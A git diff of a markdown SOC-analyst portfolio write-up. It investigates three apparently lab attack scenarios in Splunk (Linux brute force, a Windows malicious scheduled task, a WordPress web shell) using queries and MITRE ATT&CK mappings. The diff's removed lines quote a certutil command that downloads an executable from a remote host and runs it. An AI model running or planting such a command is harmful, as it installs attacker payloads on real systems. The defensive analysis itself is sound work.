@@ -1,144 +1,156 @@
 # Using Splunk to Triage Alerts and Investigate Malicious Activity
 
+**See the project summary:** [README.md](README.md)
+
 ## Executive Summary
 This portfolio documents my hands-on investigation of three distinct cyber-attack scenarios in a simulated Security Operations Centre (SOC) environment. Using Splunk as my primary tool, I successfully triaged and analysed alerts for a Linux brute-force attack, a Windows malicious scheduled task, and a web shell upload on a compromised server.
 
 For each incident, I followed a methodical process to identify key indicators of compromise (IoCs), scope the impact, and map the attacker's actions to the MITRE ATT&CK framework. This work demonstrates my practical ability to perform essential Level 1 SOC analyst functions, from initial alert assessment to detailed forensic investigation and threat reporting.
 
-## Alert Scenario #1: Linux Brute Force Attack
+---
 
-### Alert Details
+## Alert Scenario #1: Linux Brute-Force Attack
+
+**Alert Details:**
 *   **Alert Name:** Brute Force Activity Detection
 *   **Time:** 17/09/2025 9:00:21 AM
 *   **Target Host:** `tryhackme-2404`
 *   **Source IP:** `10.10.242.248`
 
-**Objective:** Investigate this activity and determine if it is suspicious.
+**Objective:** Investigate this activity and decide whether it should be considered suspicious.
 
-### Tools & Technologies Used
-*   **Splunk**
+**Tools & Technologies Used:** Splunk
 
 ### Methodology & Findings
-1.  **Initial Filtering:** I filtered the `auth.log` for events from the source IP to assess activity.
+1.  **Initial Filtering:** I first filtered the authentication logs (`auth.log`) for all `Failed` and `Accepted` password events from the source IP `10.10.242.248`.
     ```splunk
     index="linux-alert" src_ip="10.10.242.248" action=failure OR action=success
     ```
-    The results showed an anomalous volume of `Failed password` and `Accepted password` events for the user `john.smith`.
+    This revealed a disproportionate volume of events for user `john.smith` compared to other users.
 
 ![Splunk events](screenshots/Number-of-login-events-john.smith.png)
 
-2.  **Quantifying the Attack:** I isolated attempts against `john.smith` to quantify the attack.
+2.  **Focused User Analysis:** I drilled down into the success and failure rates for `john.smith` from the suspicious IP.
     ```splunk
     index="linux-alert" action=failure OR action=success user_name="john.smith" src_ip="10.10.242.248"
     ```
-    *   **Finding:** `500 failed login attempts` occurred within a 5-minute window, followed by `3 successful accepted password` events from the same IP. This is a definitive indicator of a successful brute-force attack.
+    **Finding:** `500 failed login` events occurred within a 5-minute window, followed by `3 successful "Accepted password"` events from the same IP. This is a clear indicator of a successful brute-force attack.
 
 ![Splunk events](screenshots/Number-of-login-events-john.smith-2.png)
 
-3.  **Visualisation & Further Investigation:** Using a pre-built query, I visualised all authentication activity from the suspicious IP to confirm the target user.
-    *   **Privilege Escalation:** Searching activity by `john.smith` post-compromise revealed the attacker abused `sudo` to escalate privileges to `root`.
+4.  **Data Visualisation:** I utilised a pre-written query to visualise the attack pattern, confirming the targeted nature of the activity.
+
+![Splunk events](screenshots/Number-of-login-events-john.smith-Data-visualisation.png)
+
+5.  **Post-Compromise Activity:** Investigating activity post-successful login revealed further attacker actions:
+    *   **Privilege Escalation:** The attacker abused `sudo` to escalate `john.smith`'s privileges to `root`.
         ```splunk
         index="linux-alert" john.smith app=sudo
         ```
-    *   **Persistence:** I discovered a persistence mechanism by searching for new user creation events, which revealed the attacker created a backdoor account named **`system-utm`**.
+    *   **Persistence:** A new user account named `system-utm` was created, a common technique for maintaining access.
         ```splunk
         index="linux-alert" adduser
         ```
 
 ### MITRE ATT&CK Summary for Alert #1
-*   **Initial Access (T1110):** Credential Access via Brute Force against user `john.smith`.
-*   **Privilege Escalation (T1548):** Abused `sudo` to gain `root` privileges.
-*   **Persistence (T1136):** Created a new user (`system-utm`) for persistent access.
+*   **TA0001: Initial Access**
+    *   **T1110 - Brute Force:** Credential attack against user `john.smith`.
+*   **TA0004: Privilege Escalation**
+    *   **T1548 - Abuse Elevation Control Mechanism:** Abused `sudo` to gain `root` privileges.
+*   **TA0003: Persistence**
+    *   **T1136 - Create Account:** Created the `system-utm` user for persistent backdoor access.
 
-### Conclusion
-A successful brute-force attack led to full system compromise (root access) and the creation of a persistent backdoor account.
+**Conclusion:** A successful brute-force attack led to full system compromise (root access) and the creation of a persistent backdoor account.
 
 ---
 
 ## Alert Scenario #2: Windows Malicious Scheduled Task
 
-### Alert Details
+**Alert Details:**
 *   **Alert Name:** Potential Task Scheduler Persistence Identified
 *   **Time:** 30/08/2025 10:06:07 AM
 *   **Host:** `WIN-H015`
 *   **User:** `oliver.thompson`
 *   **Task Name:** `AssessmentTaskOne`
 
-**Objective:** Investigate the scheduled task creation and determine its intent.
+**Objective:** Investigate this activity and decide whether it should be considered suspicious.
 
-### Tools & Technologies Used
-*   **Splunk**
+**Tools & Technologies Used:** Splunk
 
 ### Methodology & Findings
-1.  **Identifying the Task:** I filtered logs for the specific task name using Windows Event ID `4698` (Scheduled Task Creation).
+1.  **Alert Validation:** I filtered logs using the unique task name and Windows Event ID 4698 (Scheduled Task Creation).
     ```splunk
     index="win-alert" "AssessmentTaskOne" EventCode=4698
     ```
-    *   **Finding:** The task was configured to execute a malicious command daily:
-        ```powershell
-        "certutil.exe -urlcache -f http://tryhotme:9876/rv.exe C:\Users\OLIVER~1.THO\AppData\Local\Temp\3\DataCollector.exe; Start-Process C:\Users\OLIVER~1.THO\AppData\Local\Temp\3\DataCollector.exe"
-        ```
-        This uses `certutil.exe` (a living-off-the-land binary) to download (`-f`) and execute a remote payload.
+    A single, clearly malicious log was returned. The task was configured to execute daily, running a PowerShell command that used `certutil.exe` to download (`rv.exe`) and execute (`DataCollector.exe`) a payload from `http://tryhotme:9876`.
 
-2.  **Deeper Investigation:**
-    *   **Process Creation:** Traced the task's parent process to `cmd.exe` executed by the user `WIN-H015\oliver.thompson`.
-    *   **Reconnaissance:** Discovered the attacker enumerated the local **`Administrators`** group to map privileged accounts.
-        ```splunk
-        index="win-alert" "Group" Account_Name="oliver.thompson"
-        ```
-    *   **Lateral Movement Origin:** Identified that the initial logon to the compromised host (`WIN-H015`) originated from another workstation: **`DEV-QA-SERVER`**.
-        ```splunk
-        index="win-alert" host="WIN-H015" EventCode=4624
-        ```
+2.  **Process Ancestry:** Using the parent process ID from the log, I traced the task creation to `C:\Windows\system32\cmd.exe` run by user `WIN-H015\oliver.thompson`.
+
+3.  **Attacker Reconnaissance:** I discovered the attacker enumerated the local "Administrators" group, likely to map privileged accounts for lateral movement.
+    ```splunk
+    index="win-alert" "Group" Account_Name="oliver.thompson"
+    ```
+
+4.  **Source Identification:** By checking successful logon events (Event ID 4624) on the target host, I identified the initial access point.
+    ```splunk
+    index="win-alert" host="WIN-H015" EventCode=4624
+    ```
+    **Finding:** The attacker initially accessed `WIN-H015` from the workstation `DEV-QA-SERVER`.
 
 ### MITRE ATT&CK Summary for Alert #2
-*   **Persistence (T1053.005):** Created a malicious scheduled task (`AssessmentTaskOne`).
-*   **Execution & Defense Evasion (T1059.003, T1105):** Used `cmd.exe` and `certutil.exe` to download/execute a payload.
-*   **Discovery (T1069.002):** Enumerated the local "Administrators" group.
-*   **Lateral Movement (T1570):** Initial access originated from `DEV-QA-SERVER`.
+*   **TA0003: Persistence**
+    *   **T1053.005 - Scheduled Task:** Created malicious task `AssessmentTaskOne`.
+*   **TA0002: Execution & TA0005: Defense Evasion**
+    *   **T1059.003 - Command and Scripting Interpreter:** Used `cmd.exe` and `certutil.exe` to download and execute a payload (**T1105 - Ingress Tool Transfer**).
+*   **TA0007: Discovery**
+    *   **T1069.002 - Permission Groups Discovery:** Enumerated the local "Administrators" group.
+*   **TA0008: Lateral Movement**
+    *   **T1570 - Lateral Tool Transfer:** Initial access originated from a compromised workstation (`DEV-QA-SERVER`).
 
-### Conclusion
-An attacker with initial network access established persistence via a malicious scheduled task to download a payload and performed reconnaissance on local administrator groups.
+**Conclusion:** An attacker created a persistent, malicious scheduled task to download and execute a payload, following initial access and reconnaissance of local admin groups.
 
 ---
 
 ## Alert Scenario #3: Web Shell Upload & Brute-Force
 
-### Alert Details
+**Alert Details:**
 *   **Alert Name:** Potential Web Shell Upload Detected
 *   **Time:** 14/09/2025 09:31:51 AM
 *   **Resource:** `http://web.trywinme.thm`
 *   **Suspicious IP:** `171.251.232.40`
 
-**Objective:** Investigate web server activity for signs of compromise.
+**Objective:** Investigate this activity and decide whether it should be considered suspicious.
 
-### Tools & Technologies Used
-*   **Splunk**
-*   **Threat Intelligence:** AbuseIPDB, VirusTotal
+**Tools & Technologies Used:** Splunk, AbuseIPDB, VirusTotal
 
 ### Methodology & Findings
-1.  **Threat Intelligence Enrichment:** The source IP (`171.251.232.40`) was confirmed as malicious with over **12,500 community reports** on threat intelligence platforms, raising the alert's priority.
+1.  **Threat Intelligence Enrichment:** I first queried external platforms (AbuseIPDB, VirusTotal) for the suspicious IP (`171.251.232.40`). It was confirmed malicious with over 12,500 community reports, instantly raising the alert's priority.
 
-2.  **Web Shell Activity:** I queried web logs for activity from the malicious IP.
+2.  **Web Log Analysis:** Filtering web server (`access.log`) traffic from the malicious IP revealed active interaction with a known PHP web shell (`b374k.php`).
     ```splunk
     index=web-alert clientip="171.251.232.40" http://web.trywinme.thm
     ```
-    *   **Finding:** The attacker uploaded and accessed a known, full-featured PHP web shell (`b374k.php`) via a compromised WordPress theme editor (`/wp-admin/theme-editor.php`).
+    The attacker accessed the shell via the WordPress theme editor (`/wp-admin/theme-editor.php?file=b374k.php`) and issued commands through `/wp-admin/admin-ajax.php`.
 
-3.  **Visualising the Attack Chain:** I tabled all activity from the malicious IP to see the full sequence.
+3.  **Attack Timeline Reconstruction:** A broader query visualised all activity from the malicious IP, sorting by time.
     ```splunk
-    index=web-alert 171.251.232.40 | table _time clientip useragent uri_path method status | sort + _time
+    index=web-alert 171.251.232.40
+    | table _time clientip useragent uri_path method status
+    | sort + _time
     ```
-    *   **Finding:** The attack began with a **brute-force attempt** against `/wp-login.php` using the tool **`Hydra`**, visible in the user agent.
-    *   **Web Shell Execution:** Subsequent `POST` requests to `/wp-admin/admin-ajax.php` with the `b374k.php` referrer confirmed the attacker was actively issuing commands through the web shell.
+    **Finding:** The attack began earlier with a brute-force attempt against `/wp-login.php` using the tool `Hydra` (visible in the User-Agent string), which started at `2025-09-14 21:20:27`.
+
+4.  **Web Shell Activity Isolation:** A final query specifically detailed the web shell execution, showing the initial access GET request and subsequent command execution POST requests.
 
 ### MITRE ATT&CK Summary for Alert #3
-*   **Persistence (T1505.003):** Established a **Web Shell** (`b374k.php`) on the server.
-*   **Execution (T1059):** Achieved command execution via the PHP web shell.
-*   **Credential Access (T1110):** Attempted **Brute Force** on the WordPress login using Hydra.
+*   **TA0003: Persistence**
+    *   **T1505.003 - Server Software Component:** Uploaded the `b374k.php` web shell.
+*   **TA0002: Execution**
+    *   **T1059 - Command and Scripting Interpreter:** Executed commands via the PHP web shell.
+*   **TA0006: Credential Access**
+    *   **T1110 - Brute Force:** Attempted to brute-force WordPress credentials using Hydra.
 
-### Conclusion
-An attacker successfully uploaded a web shell to a web server, establishing persistent remote access. The attack was preceded by a brute-force attempt against administrative credentials. The malicious source IP was corroborated by external threat intelligence.
+**Conclusion:** An attacker successfully uploaded a web shell to a web server, establishing persistent remote access after an attempted brute-force attack on administrative credentials.
 
 ---
 
@@ -146,6 +158,6 @@ An attacker successfully uploaded a web shell to a web server, establishing pers
 Investigating these three scenarios provided critical insights into real-world attack sequences and defensive analysis:
 
 *   **Attackers Follow a Predictable "Kill Chain":** Each scenario illustrated clear progression (e.g., brute-force → privilege escalation → persistence). Recognizing these patterns allows an analyst to anticipate and hunt for related activity.
-*   **Effective Triage Requires Correlation:** A comprehensive investigation depends on synthesizing information from different log types (authentication, process creation, web access). Correlating logs from `DEV-QA-SERVER` with those on `WIN-H015` was key to understanding the lateral movement in Alert #2.
-*   **Threat Intelligence is a Force Multiplier:** Consulting external sources (AbuseIPDB, VirusTotal) to confirm the reputation of an IP transforms a suspicious event into a high-confidence alert, enabling faster, more decisive response.
-*   **MITRE ATT&CK is the Essential Language for Reporting:** Mapping evidence to specific techniques (e.g., T1053.005, T1505.003) is crucial for clearly communicating the nature of the threat to both technical teams and management, ensuring a unified understanding of risk.
+*   **Effective Triage Requires Correlation:** A comprehensive investigation depends on synthesizing information from different log types (auth, Windows Event, web server) and connecting events across hosts.
+*   **Threat Intelligence is a Force Multiplier:** Consulting external sources (AbuseIPDB, VirusTotal) to confirm the reputation of an IOC transforms a suspicious event into a high-confidence alert, enabling a faster, more decisive response.
+*   **MITRE ATT&CK is the Essential Language:** Mapping evidence to specific techniques is crucial for clearly communicating the nature of the threat to both technical teams and management, ensuring a unified understanding of risk and response priorities.
